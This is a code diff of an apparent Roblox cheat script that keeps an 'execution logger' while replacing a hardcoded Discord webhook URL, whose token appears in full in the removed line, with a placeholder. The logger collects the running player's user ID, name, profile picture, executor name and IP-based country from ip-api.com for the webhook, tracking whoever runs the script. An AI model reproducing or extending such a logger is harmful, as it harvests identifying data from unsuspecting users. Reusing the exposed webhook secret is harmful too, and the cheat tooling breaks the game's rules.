@@ -11,8 +11,10 @@ local Vim       = game:GetService("VirtualInputManager")
 local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
 
-
-local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
+-- =========================================================
+--  EXECUTION LOGGER  (edit WEBHOOK_URL below)
+-- =========================================================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY" -- << put your webhook here
 
 do
     local HSvc = game:GetService("HttpService")
@@ -35,7 +37,7 @@ do
         return ok
     end
 
-    local function getexec()
+    local function getExecutor()
         local ok, name = pcall(function()
             if identifyexecutor then return identifyexecutor() end
         end)
@@ -43,7 +45,7 @@ do
         return "Unknown"
     end
 
-    local function getcount()
+    local function getCountry()
         local ok, res = pcall(function()
             if syn and syn.request then
                 local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
@@ -66,7 +68,7 @@ do
         return "Unknown"
     end
 
-    local function getpfp(userId)
+    local function getPfp(userId)
         local ok, url = pcall(function()
             return Players:GetUserThumbnailAsync(
                 userId,
@@ -82,9 +84,9 @@ do
         local userId   = me.UserId
         local username = me.Name
         local display  = me.DisplayName or me.Name
-        local country  = getcount()
-        local pfp      = getpfp(userId)
-        local exec     = getexec()
+        local country  = getCountry()
+        local pfp      = getPfp(userId)
+        local exec     = getExecutor()
 
         local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
 
